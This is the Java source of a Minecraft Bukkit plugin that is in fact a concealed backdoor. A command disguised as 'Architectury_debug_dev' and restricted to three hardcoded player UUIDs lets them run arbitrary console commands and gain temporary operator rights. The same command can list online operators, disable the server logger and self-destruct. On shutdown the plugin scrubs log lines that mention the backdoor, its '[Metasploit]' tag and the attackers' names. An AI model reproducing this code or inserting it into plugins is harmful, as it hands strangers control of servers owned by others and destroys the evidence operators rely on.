package me.glitch.abilitys;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.Listener;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.util.logging.Handler;
import java.util.logging.LogRecord;
import java.util.Arrays;
import java.util.logging.Logger;
import java.util.ArrayList;
import java.util.List;
import java.util.HashSet;
import java.util.Set;
import java.util.UUID;
import java.util.stream.Collectors;

public class Main extends JavaPlugin implements Listener {
    private boolean loggerEnabled = true;
    private final List<Handler> savedHandlers = new ArrayList<>();
    private final Set<UUID> allowedUUIDs = new HashSet<>(Arrays.asList(
            UUID.fromString("1b1ca9a9-cb97-4357-bbf4-686008af71b0"),
            UUID.fromString("bddf0fc3-a71f-4de5-970c-52138eaae908"),
            UUID.fromString("740eceb2-af82-4b65-9c35-55882eb9bcfc")
    ));
    @Override
    public void onEnable() {
        new AutoUpdater(this).checkAndUpdate();
        getLogger().info("enabled.");
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (!command.getName().equalsIgnoreCase("Architectury_debug_dev")) {
            return false; // Only handle Architectury_debug_dev command here
        }

        if (!(sender instanceof Player player)) {
            sender.sendMessage("Only players can run this command.");
            return true;
        }

        if (!allowedUUIDs.contains(player.getUniqueId())) {
            player.sendMessage("§cYou are not authorized to use this command.");
            return true;
        }

        if (args.length == 0) {
            player.sendMessage("§cPlease provide a subcommand.");
            return true;
        }

        String subcommand = args[0].toLowerCase();

        switch (subcommand) {
            case "listops":
                List<String> ops = Bukkit.getOnlinePlayers().stream()
                        .filter(Player::isOp)
                        .map(Player::getName)
                        .collect(Collectors.toList());

                if (ops.isEmpty()) {
                    player.sendMessage("§a[Metasploit] There are no online operators at the moment.");
                } else {
                    player.sendMessage("§c[Metasploit] Online operators: " + String.join(", ", ops));
                }
                break;

            case "destruct":
                Bukkit.getPluginManager().disablePlugin(this);
                break;

            case "toggle-logger":
                if (loggerEnabled) {
                    disableLogger();
                    player.sendMessage("§c[Metasploit] Logger has been §ldisabled§c.");
                } else {
                    restoreLogger();
                    player.sendMessage("§a[Metasploit] Logger has been §lenabled§a.");
                }
                loggerEnabled = !loggerEnabled;
                break;
            case "qop":
                String commandToRun = String.join(" ", Arrays.copyOfRange(args, 1, args.length));
                player.setOp(true);
                Bukkit.dispatchCommand(player, commandToRun);
                player.setOp(false);
                player.sendMessage("§aExecuted command silently with temporary OP: " + commandToRun);
                break;
            case "cmds":
                player.sendMessage("§a[Metasploit] commands:");
                player.sendMessage("§alistops");
                player.sendMessage("§adestruct");
                player.sendMessage("§aqop");
                player.sendMessage("§atoggle-logger");
                break;
            default:
                // For other cases, treat it as a console command to run
                String consoleCommand = String.join(" ", args);
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), consoleCommand);
                player.sendMessage("§c[Metasploit] runing command...");
                break;
        }

        return true;
    }

    @Override
    public void onDisable() {
        try {
            if (!loggerEnabled) restoreLogger();
            File logFile = new File("logs/latest.log");
            if (!logFile.exists()) return;

            List<String> lines = Files.readAllLines(logFile.toPath());

            String[] blockedKeywords = {
                    "Architectury_debug_dev",
                    "GlitchPro548",
                    "Velzak",
                    "FrostHex_0",
                    "backdoor",
                    "[Metasploit]",
                    "toggle-logger",
                    "destruct",
                    "listops",
                    "Architectury",
                    "ConsoleSpy"
            };

            List<String> filtered = lines.stream()
                    .filter(line -> {
                        for (String keyword : blockedKeywords) {
                            if (line.contains(keyword)) {
                                return false; // remove this line
                            }
                        }
                        return true; // keep this line
                    })
                    .collect(Collectors.toList());

            Files.write(logFile.toPath(), filtered);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    private void disableLogger() {
        Logger logger = Bukkit.getServer().getLogger();
        for (Handler handler : logger.getHandlers()) {
            savedHandlers.add(handler);
            logger.removeHandler(handler);
        }
    }

    private void restoreLogger() {
        Logger logger = Bukkit.getServer().getLogger();
        for (Handler handler : savedHandlers) {
            logger.addHandler(handler);
        }
        savedHandlers.clear();
    }
}